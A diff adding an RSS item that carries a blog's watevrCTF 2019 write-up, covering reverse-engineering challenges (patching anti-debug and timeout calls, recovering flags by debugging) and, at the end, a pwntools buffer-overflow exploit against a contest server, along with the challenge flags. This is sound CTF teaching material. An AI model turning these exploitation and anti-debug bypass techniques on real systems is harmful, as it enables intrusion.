@@ -5,12 +5,469 @@
     <link>/tags/rev/</link>
       <atom:link href="/tags/rev/index.xml" rel="self" type="application/rss+xml" />
     <description>rev</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2019</copyright><lastBuildDate>Mon, 02 Dec 2019 19:39:57 +0530</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2019</copyright><lastBuildDate>Sun, 15 Dec 2019 11:44:06 +0530</lastBuildDate>
     <image>
       <url>/img/Shreyansh.jpg</url>
       <title>rev</title>
       <link>/tags/rev/</link>
     </image>
+    
+    <item>
+      <title>watevrCTF 2019 Writeups (Mainly Rev and Pwn)</title>
+      <link>/post/2019-12-15_watevr-ctf-2019-writeups/</link>
+      <pubDate>Sun, 15 Dec 2019 11:44:06 +0530</pubDate>
+      <guid>/post/2019-12-15_watevr-ctf-2019-writeups/</guid>
+      <description>&lt;p&gt;This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, &lt;a href=&#34;https://ctftime.org/team/72103&#34;&gt;Abs0lut3Pwn4g3&lt;/a&gt;. Our final rank was 54th.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;rev-challeneges&#34;&gt;Rev Challeneges&lt;/h1&gt;
+&lt;h2 id=&#34;timeout&#34;&gt;Timeout&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/timeout&#34;&gt;timeout&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The functions, &lt;code&gt;signal&lt;/code&gt;, &lt;code&gt;alarm&lt;/code&gt; and &lt;code&gt;delay&lt;/code&gt; all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;We see that there is a flag &lt;em&gt;can_continnue&lt;/em&gt; which is set to 0x539, but not used in the code again. Checking the functions, we find one as &lt;code&gt;generate&lt;/code&gt;, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using &lt;code&gt;set $rip = 0x4006a6&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We get the flag - &lt;strong&gt;watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2 id=&#34;hacking-for-vodka&#34;&gt;Hacking For Vodka&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/vodka&#34;&gt;vodka&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The binary has different functionalities when run normally and when run in a debugger. We know this because of the &lt;em&gt;ptrace&lt;/em&gt; call.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;I decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.&lt;/p&gt;
+&lt;p&gt;Inside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag 😛.&lt;/p&gt;
+&lt;p&gt;PS - Before the dynamic analysis, we patch the &lt;code&gt;PTRACE_TRACEME&lt;/code&gt; call to jump to the required function.&lt;/p&gt;
+&lt;p&gt;The flag is - &lt;strong&gt;watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2 id=&#34;esrever&#34;&gt;esreveR&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/esrever&#34;&gt;esrever&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;So, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.&lt;/p&gt;
+&lt;p&gt;On checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.&lt;/p&gt;
+&lt;p&gt;Again, dynamic analysis was key here.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;Before the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form &lt;code&gt;$ebp-0x10&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Tha flag was - &lt;strong&gt;watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2 id=&#34;watshell&#34;&gt;watshell&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/watshell&#34;&gt;watshell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;In this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - &amp;ldquo;give_me_the_flag_please&amp;rdquo;, and only then do we get the flag.&lt;/p&gt;
+&lt;p&gt;So, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;code&gt;strtok&lt;/code&gt; is used here, which is used to split the string at some delimiter. And also, &lt;code&gt;atol&lt;/code&gt; is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input &amp;ldquo;command&amp;rdquo; as space separated numbers.&lt;/p&gt;
+&lt;p&gt;We use dynamic analysis after we give our input, since all the precomputations are done, we don&#39;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of &lt;em&gt;10 11 12 13 14 15 16&lt;/em&gt;, the following parameters are passed -&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x5555555551af (
+   $rdi = 0x00007fffffffd370 → 0x000000000000000a,
+   $rsi = 0x0000000000000040,
+   $rdx = 0x0000000000000000,
+   $rcx = 0x00007fffffffd350 → 0x000000000000008f
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array&#39;s pointer, with the first element as 0x8f.&lt;/p&gt;
+&lt;p&gt;Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The parameters passed are -&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x555555554dc3 (
+   $rdi = 0x000000000000000a,    // inp
+   $rsi = 0x0000000000000071,    // arr_ele2
+   $rdx = 0x000000000000008f,    // arr_ele1
+   $rcx = 0x0000000000000071
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.&lt;/p&gt;
+&lt;p&gt;This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; inp, ulong arr_ele2, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; mod) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
+  
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mod)) {
+    inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (inp &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
+          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(lVar1,(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,mod);
+          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
+        }
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;);
+          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(inp,arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,mod);
+            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
+          }
+        }
+      }
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; lVar1;
+  }
+                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+  exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+}
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+  map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; m;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8f&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(m.find((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m.end())
+      m[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; i: m) {
+    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;i.first&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;i.second&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;endl;
+  }
+  string s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;give_me_the_flag_please&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c: s) {
+    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;m[c]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+  }
+  cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;endl;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, what remains is to get the enoced values corresponding to &amp;ldquo;give_me_the_flag_please&amp;rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.&lt;/p&gt;
+&lt;p&gt;The flag is - &lt;strong&gt;watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
+&lt;h2 id=&#34;voting-machine-1&#34;&gt;Voting Machine 1&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze&#34;&gt;kamikaze&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This is a buffer overflow challenge as gets has been used. There is a function &lt;code&gt;super_secret_function&lt;/code&gt;. We basically have to jump there as it prints the flag. Pretty straightforward.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The offset of the crash is calculated using gef&#39;s pattern create and pattern search functionality.&lt;/p&gt;
+&lt;p&gt;My exploit code -&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./kamikaze&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./kamikaze&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;13.48.67.196&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)
+
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400807&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(func)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;payload&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
